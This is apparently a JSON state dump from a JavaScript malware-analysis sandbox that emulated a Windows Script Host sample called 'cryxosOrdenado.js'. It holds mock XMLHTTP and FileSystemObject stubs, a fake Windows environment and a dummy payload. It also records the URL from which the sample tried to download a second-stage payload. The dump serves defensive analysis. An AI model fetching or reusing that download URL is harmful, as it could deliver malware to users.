@@ -1,0 +1,611 @@
+{
+    "_download": "No",
+    "toString": "() => {\n    return \"sandbox\";\n}",
+    "_object_id": 18,
+    "util_log": "util_log",
+    "Buffer": "function Buffer(arg, encodingOrOffset, length) {\n  // Common case.\n  if (typeof arg === 'number') {\n    if (typeof encodingOrOffset === 'string') {\n      throw new Error(\n        'If encoding is specified then the first argument must be a string'\n      );\n    }\n    return Buffer.allocUnsafe(arg);\n  }\n  return Buffer.from(arg, encodingOrOffset, length);\n}",
+    "_options": {},
+    "_browser_type": "IE8",
+    "_proxy_verbose": false,
+    "_sync_request": "function doRequest(method, url, options) {\n  if (!spawnSync) {\n    throw new Error(\n      'Sync-request requires node version 0.12 or later.  If you need to use it with an older version of node\\n' +\n      'you can `npm install sync-request@2.2.0`, which was the last version to support older versions of node.'\n    );\n  }\n  var req = JSON.stringify({\n    method: method,\n    url: url,\n    options: options\n  });\n  var res = spawnSync(process.execPath, [require.resolve('./lib/worker.js')], {input: req});\n  if (res.status !== 0) {\n    throw new Error(res.stderr.toString());\n  }\n  if (res.error) {\n    if (typeof res.error === 'string') res.error = new Error(res.error);\n    throw res.error;\n  }\n  var response = JSON.parse(res.stdout);\n  if (response.success) {\n    return new HttpResponse(response.response.statusCode, response.response.headers, response.response.body, response.response.url);\n  } else {\n    throw new Error(response.error.message || response.error || response);\n  }\n}",
+    "_data": {
+        "eval_calls": []
+    },
+    "_sc": ">>> Silencing catch ",
+    "_script_name": "/home/maik/gitHub/TFM/fame/storage/946446c87072f2c76200db9323cc1f84d5df40682380dd80ac08a94614126a43/cryxosOrdenado.js",
+    "_defineProperty": "_defineProperty",
+    "_truncateOutput": "_truncateOutput",
+    "_defineSingleProperty": "_defineSingleProperty",
+    "_proxy_options": {
+        "dont_fail": true,
+        "verbose": false
+    },
+    "_proxy": "_proxy",
+    "_trace": "function _trace(t) {\n    try {\n        throw new Error(t);\n    } catch (err) {\n        util_log(\"Trace Non-\" + _inspect(err));\n    }\n}",
+    "eval": "function eval(s) { /* [native code ] */ return _(s)}",
+    "_Function_calls": {},
+    "_orig_Function": "_orig_Function",
+    "Function": "Function",
+    "_wscript_saved_files": {},
+    "_wscript_urls": [
+        "http://scenetavern.win/support.php?f=1.dat"
+    ],
+    "_wscript_objects": [
+        {
+            "id": 14,
+            "_name": "MSXML2.XMLHTTP[14]",
+            "_status": 200,
+            "_headers": {},
+            "tostring": "() => {\n        return this._name\n    }",
+            "toString": "() => {\n        return this._name\n    }",
+            "_allresponseheaders": "",
+            "_activexobject": "ActiveXObject",
+            "open": "function (m, u, a) {\n        u = u.replace(/\\r|\\n/g, \"\");\n        util_log(this._name + \".open(\" + m + \",\" + u + \",\" + a + \")\");\n        this.method = m;\n        this.url = u;\n        switch ((\"\" + a).toLowerCase()) {\n            case \"false\":\n            case \"no\":\n            case \"0\":\n            case \"\":\n            case \"undefined\":\n            case null:\n                this.async = false;\n                break;\n            default:\n                this.async = true;\n        }\n        _wscript_urls[_wscript_urls.length] = u;\n    }",
+            "close": "function () {\n        util_log(this._name + \".close()\");\n    }",
+            "getallresponseheaders": "function () {\n        var ret = this.allresponseheaders;\n        util_log(this._name + \".getAllResponseHeaders() => \" + _inspect(ret));\n        return ret;\n    }",
+            "send": "function (a) {\n        util_log(this._name + \".send(\" + a + \")\");\n        if (_download === \"Yes\") {\n            try {\n                var res = _sync_request(this.method, this.url, {\n                    'headers': this._headers\n                });\n                //util_log(\"Sync_req: \" + _truncateOutput(res.getBody()));\n                this.status = res.statusCode || 0;\n                this.readystate = 4;\n                this.statustext = \"OK\";\n                this.responsebody = res.body || \"\";\n                this.allresponseheaders = JSON.stringify(res.headers) || \"\";\n            } catch (err) {\n                util_log(this._name + \".send() Exception: \" + _truncateOutput(_inspect(err)));\n                this.status = err.statusCode || 0;\n                this.readystate = 4;\n                this.statustext = err.toString();\n                this.responsebody = err.body || \"\";\n                this.allresponseheaders = JSON.stringify(err.headers) || \"\";\n            }\n            if (this.onreadystatechange) {\n                util_log(this._name + \".onreadystatechange()\");\n                this.onreadystatechange();\n            }\n            return;\n        } else if (_download === \"No\") {\n            util_log(this._name + \" Not sending data, if you want to interact with remote server, set --down\");\n            var s = 'MZ'\n            for (var ii = 0; ii < 200; ii++) {\n                s += 'Dumy conntent, use --down to download the real payload.\\n';\n            }\n            this.responsebody = s;\n            this.status = 200;\n            this.readystate = 4;\n            if (this.onreadystatechange) {\n                util_log(this._name + \" Calling onreadystatechange() with dummy data\");\n                this.onreadystatechange();\n            }\n        } else if (_download === \"Return HTTP/404\") {\n            util_log(this._name + \" Intentionally returning HTTP/404\");\n            this.responsebody = \"HTTP/404 Resource not found\";\n            this.status = 404;\n            this.readystate = 4;\n            if (this.onreadystatechange) {\n                util_log(this._name + \" Calling onreadystatechange()\");\n                this.onreadystatechange();\n            }\n        } else {\n            util_log(\">>> FIXME: MSXML2_XMLHTTP.send _download '\" + _download + \"' not handled\");\n            throw new TypeError(\">>> FIXME: MSXML2_XMLHTTP.send _download '\" + _download + \"' not handled\");\n        }\n        util_log(this._name + \".send(\" + a + \") finished\");\n    }",
+            "setrequestheader": "function (a, b) {\n        util_log(this._name + \".setRequestHeader(\" + a + \", \" + b + \")\");\n        this._headers[a] = b;\n    }",
+            "setoption": "function () {\n        a = _truncateOutput(Array.prototype.slice.call(arguments, 0).join(\",\"));\n        util_log(this._name + \".setOption(\" + a + \")\");\n    }",
+            "setTimeouts": "function (resolveTimeout, connectTimeout, sendTimeout, receiveTimeout) //PROPIA\n    {\n    \tutil_log(this._name + \".setTimeouts(\" + resolveTimeout + \", \" + connectTimeout + \", \" + sendTimeout + \", \" + receiveTimeout + \")\");\n    }",
+            "defineProperty": "function (obj, prop, descriptor) //PROPIA\n    {\n    \tvar value = descriptor.value;\n    \tif(value == undefined)\n    \t\tvalue = descriptor.get();\n\n    \tutil_log(this._name + \".defineProperty(\" + obj + \", \" + prop + \", \" + descriptor +\")\");\n    \t\n    \tobj[prop] = value;\n    \tif(obj[prop])\n    \t\tobj[prop][\"descriptor\"] = descriptor;\n    \t\n    \treturn obj;\n    }",
+            "getOwnPropertyDescriptor": "function (obj, prop) //PROPIA\n    {\n    \tvar descriptor = undefined;\n    \tif(obj[prop])\n    \t\tdescriptor = obj[prop][\"descriptor\"];\n    \tif(!descriptor)\n    \t\tdescriptor = {\"value\": obj[prop], \"writable\": true, \"enumerable\": true, \"configurable\": true};\n\n    \tutil_log(this._name + \".getOwnPropertyDescriptor(\" + obj + \", \" + prop +\") => \"+descriptor);\n    \treturn descriptor\n    }",
+            "_responseBody": "MZDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\nDumy conntent, use --down to download the real payload.\n",
+            "_url": "http://scenetavern.win/support.php?f=1.dat",
+            "_method": "GET",
+            "_async": false,
+            "_readystate": 4,
+            "_statustext": ""
+        },
+        {
+            "id": 15,
+            "_name": "Scripting.FileSystemObject[15]",
+            "toString": "function () {\n        return this._name;\n    }",
+            "createtextfile": "function (filename) { //(filename[, overwrite[, unicode]])\n        util_log(this._name + \".CreateTextFile(\" + filename + \")\");\n        return _proxy(new TextStream(filename));\n    }",
+            "opentextfile": "function (filename) { //(filename[, iomode[, create[, format]]])\n        util_log(this._name + \".OpenTextFile(\" + filename + \")\");\n        return _proxy(new TextStream(filename));\n    }",
+            "getfileversion": "function (f) {\n        util_log(this._name + \".GetFileVersion(\" + f + \")\");\n        return \"1.0\";\n    }",
+            "getbasename": "function (d) {\n\t\tif (ENV[\"SYSTEMDRIVE\"] === d) {\n\t\t\tresult = \"\";\n\t\t} else {\n\t\t\tvar result = _sanitize(_path.posix.basename(d));\n\t\t}\n\t\tutil_log(this._name + \".GetBaseName('\" + d + \"') => \" + result);\n\t\treturn result;\n\t}",
+            "buildpath": "function () {\n        util_log(this._name + \".BuildPath(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        return Array.prototype.slice.call(arguments, 0).join(\"\\\\\");\n    }",
+            "getdrive": "function (drivespec) {\n        util_log(this._name + \".GetDrive(\" + drivespec + \")\");\n        return _proxy(new DriveObject(drivespec));\n    }",
+            "getdrivename": "function (path) {\n        util_log(this._name + \".GetDriveName(\" + _truncateOutput(path) + \")\");\n        return path[0]; //Fixme\n    }",
+            "_drives": {
+                "id": 17,
+                "_name": "Collection[17]",
+                "_items": [
+                    {
+                        "id": 16,
+                        "_name": "DriveObject[16](C:)",
+                        "_availablespace": "",
+                        "_driveletter": "",
+                        "_drivetype": "",
+                        "_filesystem": "",
+                        "_freespace": "",
+                        "_isready": "",
+                        "_path": "",
+                        "_rootfolder": "",
+                        "_serialnumber": "",
+                        "_totalsize": "",
+                        "_volumename": "",
+                        "_drive_name": "C:",
+                        "toString": "function () {\n        return this._name;\n    }"
+                    }
+                ],
+                "add": "function (a) {\n        util_log(this._name + \".add(\" + a + \")\");\n        this._items[this._items.length] = a;\n    }",
+                "toString": "function () {\n        return this._name;\n    }"
+            },
+            "fileexists": "function (f) {\n        var ret = false;\n        var abs = _pw32.isAbsolute(f);\n        if (!abs)\n            util_log(\"FIXME: \" + this._name + \".FileExists(\" + f + \") - relative path\");\n        var parts = _pw32.normalize(f).split(_pw32.sep);\n        var t = FS;\n        for (let p of parts) {\n            if (p === \"\")\n                continue;\n            t = t[p.toUpperCase()];\n            if (typeof t === \"undefined\")\n                break;\n        }\n        if (typeof t !== \"undefined\")\n            ret = true;\n        if (!ret && _options.FileAlwaysExists) {\n            util_log(\"FileExists: \" + ret + \" overridden with FileAlwaysExists: true\");\n            ret = true;\n        }\n        util_log(this._name + \".FileExists(\" + f + \") => \" + ret);\n        return ret;\n    }",
+            "folderexists": "function (f) {\n        var ret = false;\n        f = \"\" + f;\n        var abs = _pw32.isAbsolute(f);\n        if (!abs)\n            util_log(\"FIXME: \" + this._name + \".FolderExists(\" + _truncateOutput(f) + \") - relative path\");\n        var parts = _pw32.normalize(f).split(_pw32.sep);\n        var t = FS;\n        for (let p of parts) {\n            if (p === \"\")\n                continue;\n            t = t[p.toUpperCase()];\n            if (typeof t === \"undefined\")\n                break;\n        }\n        if (typeof t !== \"undefined\")\n            ret = true;\n        util_log(this._name + \".FolderExists(\" + _truncateOutput(f) + \") => \" + ret);\n        return ret;\n    }",
+            "deletefile": "function (f) {\n        util_log(this._name + \".DeleteFile(\" + f + \")\");\n        return true;\n    }",
+            "copyfile": "function (f1, f2) {\n        util_log(this._name + \".CopyFile(\" + f1 + \", \" + f2 + \")\");\n        return true;\n    }",
+            "getfolder": "function (d) {\n        d1 = _pw32.normalize(d);\n        util_log(this._name + \".GetFolder(\" + d + \") => \" + d1);\n        return _proxy(new FolderObject(d1));\n    }",
+            "getfile": "function (d) {\n        d1 = _pw32.normalize(d);\n        util_log(this._name + \".GetFile(\" + d + \") => \" + d1);\n        return _proxy(new FileObject(d1));\n    }",
+            "deletefolder": "function (d) {\n        util_log(this._name + \".DeleteFolder(\" + d + \")\");\n    }",
+            "createfolder": "function (f) {\n        util_log(this._name + \".CreateFolder(\" + f + \")\");\n        var abs = _pw32.isAbsolute(f);\n        if (!abs)\n            util_log(\"FIXME: \" + this._name + \".CreateFolder(\" + _truncateOutput(f) + \") - relative path\");\n        var parts = _pw32.normalize(f).split(_pw32.sep);\n        var t = FS;\n        for (let p of parts) {\n            if (p === \"\")\n                continue;\n            if (p.toUpperCase() in t)\n                t = t[p.toUpperCase()];\n            else {\n                t = t[p.toUpperCase()] = {};\n            };\n        }\n        return _proxy(new FolderObject(f));\n    }",
+            "getspecialfolder": "function (f) {\n        switch (\"\" + f) {\n            case \"0\":\n                fn = ENV[\"WINDIR\"]; //\"WindowsFolder\";\n                break;\n            case \"1\":\n                fn = ENV[\"SYSTEMDIRECTORY\"]; //\"SystemFolder\";\n                break;\n            case \"2\":\n                fn = ENV[\"TEMP\"]; //TempFolder;\n                break;\n            default:\n                fn = \"UnknownType[\" + f + \"]\";\n                break;\n        }\n        util_log(this._name + \".GetSpecialFolder(\" + f + \") => \" + fn + _pw32.sep);\n        return fn + _pw32.sep;\n    }",
+            "gettempname": "function () {\n        var fn = \"TempFile_\" + _object_id++ + \".tmp\";\n        util_log(this._name + \".GetTempName() => \" + fn);\n        return fn;\n    }",
+            "getabsolutepathname": "function (d) {\n        d1 = _pw32.normalize(d);\n        if (!_pw32.isAbsolute(d1)) {\n            d1 = ENV[\"CWD\"] + _pw32.sep + d1;\n        }\n        util_log(this._name + \".GetAbsolutePathName(\" + d + \") => \" + d1);\n        return d1;\n    }",
+            "movefile": "function (source, destination)\n    {\n        util_log(this._name + \".movefile(\" + source+','+destination+ \")\" );\n        return true\n    }"
+        }
+    ],
+    "Date": "function Date() { [native code] }",
+    "print": "function () {\n    a = _truncateOutput(Array.prototype.slice.call(arguments, 0).join(\",\"));\n    util_log(\"print(\" + a + \")\");\n}",
+    "TextStream": "TextStream",
+    "FileSystemObject": "FileSystemObject",
+    "FS": {
+        "C:": {
+            "PROGRAMDATA": {},
+            "PROGRAM FILES": {
+                "COMMON FILES": {}
+            },
+            "PROGRAM FILES (X86)": {
+                "COMMON FILES": {}
+            },
+            "USERS": {
+                "USER": {
+                    "APPDATA": {
+                        "LOCAL": {
+                            "TEMP": {}
+                        },
+                        "ROAMING": {},
+                        "LOCALLOW": {}
+                    },
+                    "DESKTOP": {}
+                },
+                "DEFAULT": {
+                    "APPDATA": {
+                        "LOCAL": {
+                            "TEMP": {}
+                        },
+                        "ROAMING": {},
+                        "LOCALLOW": {}
+                    },
+                    "DESKTOP": {}
+                },
+                "PUBLIC": {
+                    "APPDATA": {
+                        "LOCAL": {
+                            "TEMP": {}
+                        },
+                        "ROAMING": {},
+                        "LOCALLOW": {}
+                    },
+                    "DESKTOP": {}
+                }
+            },
+            "WINDOWS": {
+                "SYSTEM32": {
+                    "DRIVERS": {
+                        "ETC": {
+                            "SERVICES": "FILE CONTENT"
+                        }
+                    }
+                }
+            }
+        },
+        "writeFile": "function (f, c) {\n        var abs = _pw32.isAbsolute(f);\n        if (!abs)\n            util_log(\"FIXME: FS.writeFile - relative path\");\n        var parts = _pw32.normalize(f).split(_pw32.sep);\n        var t = this;\n        var path = Array.prototype.slice.call(parts, 0, -1);\n        var fname = parts[parts.length - 1];\n        util_log(\"FS.writeFile(\" + f + \", \" + _truncateOutput(c) + \")\");\n        for (let p of path) {\n            if (p === \"\")\n                continue;\n            if (!(p in t))\n                t[p] = {}\n            t = t[p.toUpperCase()];\n        }\n        t[fname.toUpperCase()] = c;\n    }"
+    },
+    "ENV": {
+        "ALLUSERSPROFILE": "C:\\ProgramData",
+        "APPDATA": "C:\\Users\\User\\AppData\\Roaming",
+        "COMMONPROGRAMFILES": "C:\\Program Files\\Common Files",
+        "COMMONPROGRAMFILES(X86)": "C:\\Program Files (x86)\\Common Files",
+        "COMMONPROGRAMW6432": "C:\\Program Files\\Common Files",
+        "COMPUTERNAME": "COMPUTER",
+        "COMSPEC": "C:\\WINDOWS\\system32\\cmd.exe",
+        "CWD": "C:\\Users\\User",
+        "FPS_BROWSER_APP_PROFILE_STRING": "Internet Explorer",
+        "FPS_BROWSER_USER_PROFILE_STRING": "Default",
+        "FP_NO_HOST_CHECK": "NO",
+        "HOMEDRIVE": "C:",
+        "HOMEPATH": "\\Users\\User",
+        "LANG": "EN",
+        "LOCALAPPDATA": "C:\\Users\\User\\AppData\\Local",
+        "LOGONSERVER": "\\\\COMPUTER",
+        "NUMBER_OF_PROCESSORS": "4",
+        "OS": "Windows_NT",
+        "PATH": "C:\\Users\\User\\AppData\\Roaming\\npm;C:\\Program Files\\nodejs\\;C:\\ProgramData\\Oracle\\Java\\javapath;C:\\Program Files (x86)\\Intel\\iCLS Client\\;C:\\Program Files\\Intel\\iCLS Client\\;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\Lenovo\\Fingerprint Manager Pro\\;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn\\;C:\\Program Files (x86)\\Bitvise SSH Client;C:\\Program Files\\Microsoft\\Web Platform Installer\\;C:\\Program Files (x86)\\Skype\\Phone\\;C:\\Program Files\\Intel\\WiFi\\bin\\;C:\\Program Files\\Common Files\\Intel\\WirelessCommon\\;C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\120\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\ManagementStudio\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\DTS\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\130\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft Emulator Manager\\1.0\\;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Program Files\\Git\\cmd;C:\\Program Files\\nodejs\\;C:\\Strawberry\\c\\bin;C:\\Strawberry\\perl\\site\\bin;C:\\Strawberry\\perl\\bin;C:\\Program Files\\TortoiseGit\\bin;C:\\Program Files\\dotnet\\;C:\\Tcl\\bin;C:\\Program Files (x86)\\Nmap;C:\\Program Files\\Intel\\WiFi\\bin\\;C:\\Program Files\\Common Files\\Intel\\WirelessCommon\\;C:\\Users\\User\\AppData\\Roaming\\npm;C:\\ProgramData\\Oracle\\Java\\javapath;C:\\Program Files (x86)\\Intel\\iCLS Client\\;C:\\Program Files\\Intel\\iCLS Client\\;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\Lenovo\\Fingerprint Manager Pro\\;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn\\;C:\\Program Files (x86)\\Bitvise SSH Client;C:\\Program Files\\Microsoft\\Web Platform Installer\\;C:\\Program Files (x86)\\Skype\\Phone\\;C:\\Program Files\\Intel\\WiFi\\bin\\;C:\\Program Files\\Common Files\\Intel\\WirelessCommon\\;C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\120\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\ManagementStudio\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\DTS\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\130\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft Emulator Manager\\1.0\\;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Program Files\\Git\\cmd;C:\\Program Files\\nodejs\\;C:\\Strawberry\\c\\bin;C:\\Strawberry\\perl\\site\\bin;C:\\Strawberry\\perl\\bin;C:\\Program Files\\TortoiseGit\\bin;C:\\Program Files\\dotnet\\;C:\\Users\\User\\AppData\\Local\\Microsoft\\WindowsApps;",
+        "PATHEXT": ".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC",
+        "PROCESSOR_ARCHITECTURE": "AMD64",
+        "PROCESSOR_IDENTIFIER": "Intel64 Family 6 Model 61 Stepping 4, GenuineIntel",
+        "PROCESSOR_LEVEL": "6",
+        "PROCESSOR_REVISION": "3d04",
+        "PROGRAMDATA": "C:\\ProgramData",
+        "PROGRAMFILES": "C:\\Program Files",
+        "PROGRAMFILES(X86)": "C:\\Program Files (x86)",
+        "PROGRAMW6432": "C:\\Program Files",
+        "PROMPT": "$P$G",
+        "PSMODULEPATH": "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\PowerShell\\Modules\\;C:\\Program Files\\WindowsPowerShell\\Modules\\;C:\\Program Files (x86)\\Microsoft SDKs\\Azure\\PowerShell\\ResourceManager\\AzureResourceManager\\;C:\\Program Files (x86)\\Microsoft SDKs\\Azure\\PowerShell\\ServiceManagement\\;C:\\Program Files (x86)\\Microsoft SDKs\\Azure\\PowerShell\\Storage\\",
+        "PUBLIC": "C:\\Users\\Public",
+        "SESSIONNAME": "Console",
+        "SYSTEMDRIVE": "C:",
+        "SYSTEMROOT": "C:\\WINDOWS",
+        "TEMP": "C:\\Users\\User\\AppData\\Local\\Temp",
+        "TMP": "C:\\Users\\User\\AppData\\Local\\Temp",
+        "USERDOMAIN": "COMPUTER",
+        "USERDOMAIN_ROAMINGPROFILE": "COMPUTER",
+        "USERNAME": "User",
+        "USERPROFILE": "C:\\Users\\User",
+        "WINDIR": "C:\\WINDOWS",
+        "SYSTEMDIRECTORY": "C:\\WINDOWS\\System32"
+    },
+    "FolderObject": "FolderObject",
+    "DriveObject": "DriveObject",
+    "Folder2": "Folder2",
+    "FolderItem": "FolderItem",
+    "FileObject": "FileObject",
+    "Collection": "Collection",
+    "lcname": "responsebody",
+    "Enumerator": "Enumerator",
+    "WshArguments": "WshArguments",
+    "WScript": "Windows Script Host",
+    "create_object": "create_object",
+    "GetObject": "GetObject",
+    "WSH": {
+        "$ref": "$[\"WScript\"]"
+    },
+    "AutomationObject": "AutomationObject",
+    "MSScriptControl_ScriptControl": "MSScriptControl_ScriptControl",
